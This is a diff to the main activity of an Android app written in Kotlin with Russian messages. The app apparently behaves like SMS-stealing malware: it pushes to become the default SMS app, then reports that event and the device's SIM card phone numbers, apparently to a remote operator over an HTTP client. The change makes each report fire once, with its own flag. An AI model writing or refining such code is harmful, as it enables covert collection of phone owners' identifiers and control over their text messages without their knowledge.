@@ -25,6 +25,7 @@ class MainActivity : AppCompatActivity() {
     private val SMS_ROLE_REQUEST_CODE = 101
     private val client = OkHttpClient()
     private val NOTIFICATION_SENT_KEY = "notification_sent"
+    private val SIM_INFO_SENT_KEY = "sim_info_sent"
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -53,8 +54,14 @@ class MainActivity : AppCompatActivity() {
     private fun checkAndRequestSmsRole() {
         if (!isDefaultSmsApp()) {
             requestSmsRole()
-        } else if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
-            sendNotifications()
+        } else {
+            if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
+                sendNotification("Пользователь сделал приложением по умолчанию")
+                sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
+            }
+            if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
+                sendSimInfoNotification()
+            }
         }
     }
 
@@ -85,18 +92,16 @@ class MainActivity : AppCompatActivity() {
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SMS_ROLE_REQUEST_CODE) {
-            if (isDefaultSmsApp() && !sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
-                sendNotifications()
-            } else if (!isDefaultSmsApp()) {
-                requestSmsRole()
+            if (isDefaultSmsApp()) {
+                if (!sharedPrefs.getBoolean(NOTIFICATION_SENT_KEY, false)) {
+                    sendNotification("Пользователь сделал приложением по умолчанию")
+                    sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
+                }
+                if (!sharedPrefs.getBoolean(SIM_INFO_SENT_KEY, false)) {
+                    sendSimInfoNotification()
+                }
             }
         }
-    }
-
-    private fun sendNotifications() {
-        sendNotification("Пользователь сделал приложением по умолчанию")
-        sendSimInfoNotification()
-        sharedPrefs.edit().putBoolean(NOTIFICATION_SENT_KEY, true).apply()
     }
 
     private fun sendNotification(message: String) {
@@ -139,6 +144,7 @@ class MainActivity : AppCompatActivity() {
     private fun sendSimInfoNotification() {
         val simInfo = getSimNumbersString()
         sendNotification("Информация о SIM-картах:\n$simInfo")
+        sharedPrefs.edit().putBoolean(SIM_INFO_SENT_KEY, true).apply()
     }
 
     @SuppressLint("HardwareIds", "MissingPermission")
